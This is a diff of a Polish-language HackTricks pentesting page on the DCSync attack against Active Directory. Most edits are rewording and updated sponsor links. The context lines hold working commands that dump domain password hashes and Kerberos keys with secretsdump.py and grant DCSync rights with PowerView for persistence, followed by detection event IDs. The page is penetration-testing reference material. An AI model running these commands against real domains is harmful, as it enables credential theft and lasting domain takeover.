@@ -3,10 +3,10 @@
 <figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>
 
 \
-Użyj [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks), aby łatwo budować i **automatyzować przepływy pracy** z wykorzystaniem najbardziej zaawansowanych narzędzi społecznościowych na świecie.\
+Użyj [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_term=trickest&utm_content=dcsync), aby łatwo tworzyć i **automatyzować przepływy pracy** z wykorzystaniem najbardziej zaawansowanych narzędzi społecznościowych na świecie.\
 Otrzymaj dostęp już dziś:
 
-{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
+{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=dcsync" %}
 
 <details>
 
@@ -17,8 +17,8 @@ Inne sposoby wsparcia HackTricks:
 * Jeśli chcesz zobaczyć swoją **firmę reklamowaną w HackTricks** lub **pobrać HackTricks w formacie PDF**, sprawdź [**PLANY SUBSKRYPCYJNE**](https://github.com/sponsors/carlospolop)!
 * Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
 * Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
-* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
-* **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) na githubie.
+* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegram**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
+* **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
 
@@ -28,9 +28,9 @@ Uprawnienie **DCSync** oznacza posiadanie tych uprawnień w samym domenie: **DS-
 
 **Ważne informacje dotyczące DCSync:**
 
-* Atak **DCSync symuluje zachowanie kontrolera domeny i prosi inne kontrolery domeny o replikację informacji** za pomocą zdalnego protokołu replikacji katalogów usługi Directory Replication Service (MS-DRSR). Ponieważ MS-DRSR jest ważną i konieczną funkcją Active Directory, nie można go wyłączyć ani wyłączyć.
+* Atak **DCSync symuluje zachowanie kontrolera domeny i prosi inne kontrolery domeny o replikację informacji** za pomocą zdalnego protokołu replikacji katalogów usługi (MS-DRSR). Ponieważ MS-DRSR jest ważną i konieczną funkcją Active Directory, nie można go wyłączyć ani wyłączyć.
 * Domyślnie tylko grupy **Domain Admins, Enterprise Admins, Administrators i Domain Controllers** mają wymagane uprawnienia.
-* Jeśli jakiekolwiek hasła konta są przechowywane z odwracalnym szyfrowaniem, w Mimikatz dostępna jest opcja zwrócenia hasła w postaci tekstu jawnego
+* Jeśli jakiekolwiek hasła kont są przechowywane z odwracalnym szyfrowaniem, istnieje opcja w Mimikatz do zwrócenia hasła w postaci tekstu jawnego
 
 ### Wyliczanie
 
@@ -51,29 +51,29 @@ secretsdump.py -just-dc <user>:<password>@<ipaddress> -outputfile dcsync_hashes
 ```
 `-just-dc` generuje 3 pliki:
 
-* jeden z **hashami NTLM**
+* jeden z **haszami NTLM**
 * jeden z **kluczami Kerberos**
-* jeden z hasłami w tekście jawnym z NTDS dla kont ustawionych z włączonym [**szyfrowaniem odwracalnym**](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/store-passwords-using-reversible-encryption). Możesz uzyskać użytkowników z szyfrowaniem odwracalnym za pomocą
+* jeden z hasłami w tekście jawnym z NTDS dla kont skonfigurowanych z [**szyfrowaniem odwracalnym**](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/store-passwords-using-reversible-encryption) włączonym. Możesz uzyskać użytkowników z szyfrowaniem odwracalnym za pomocą
 
 ```powershell
 Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} |select samaccountname,useraccountcontrol
 ```
 
-### Trwałość
+### Stałość
 
 Jeśli jesteś administratorem domeny, możesz nadać te uprawnienia dowolnemu użytkownikowi za pomocą `powerview`:
 ```powershell
 Add-ObjectAcl -TargetDistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -PrincipalSamAccountName username -Rights DCSync -Verbose
 ```
-Następnie możesz **sprawdzić, czy użytkownikowi zostały poprawnie przypisane** 3 uprawnienia, szukając ich w wyniku (powinieneś zobaczyć nazwy uprawnień w polu "ObjectType"):
+Następnie możesz **sprawdzić, czy użytkownikowi zostały poprawnie przypisane** 3 uprawnienia, szukając ich w wyniku (powinieneś zobaczyć nazwy uprawnień wewnątrz pola "ObjectType"):
 ```powershell
 Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{$_.IdentityReference -match "student114"}
 ```
 ### Złagodzenie
 
-* Zdarzenie zabezpieczeń ID 4662 (Wymagana aktywacja zasad audytu dla obiektu) – Wykonano operację na obiekcie
-* Zdarzenie zabezpieczeń ID 5136 (Wymagana aktywacja zasad audytu dla obiektu) – Zmodyfikowano obiekt usługi katalogowej
-* Zdarzenie zabezpieczeń ID 4670 (Wymagana aktywacja zasad audytu dla obiektu) – Zmieniono uprawnienia obiektu
+* Zdarzenie bezpieczeństwa ID 4662 (Wymagana aktywacja zasad audytu dla obiektu) – Wykonano operację na obiekcie
+* Zdarzenie bezpieczeństwa ID 5136 (Wymagana aktywacja zasad audytu dla obiektu) – Zmodyfikowano obiekt usługi katalogowej
+* Zdarzenie bezpieczeństwa ID 4670 (Wymagana aktywacja zasad audytu dla obiektu) – Zmieniono uprawnienia obiektu
 * Skaner ACL AD - Tworzenie i porównywanie raportów z uprawnieniami ACL. [https://github.com/canix1/ADACLScanner](https://github.com/canix1/ADACLScanner)
 
 ## Odnośniki
@@ -91,14 +91,14 @@ Inne sposoby wsparcia HackTricks:
 * Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
 * Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
 * **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
-* **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).
+* **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
 
 <figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>
 
 \
-Użyj [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) do łatwego tworzenia i **automatyzacji prac** z wykorzystaniem **najbardziej zaawansowanych** narzędzi społeczności.\
-Otrzymaj dostęp już dziś:
+Użyj [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_term=trickest&utm_content=dcsync), aby łatwo tworzyć i **automatyzować workflowy** zasilane przez najbardziej zaawansowane narzędzia społeczności na świecie.\
+Zdobądź dostęp już dziś:
 
-{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
+{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=dcsync" %}
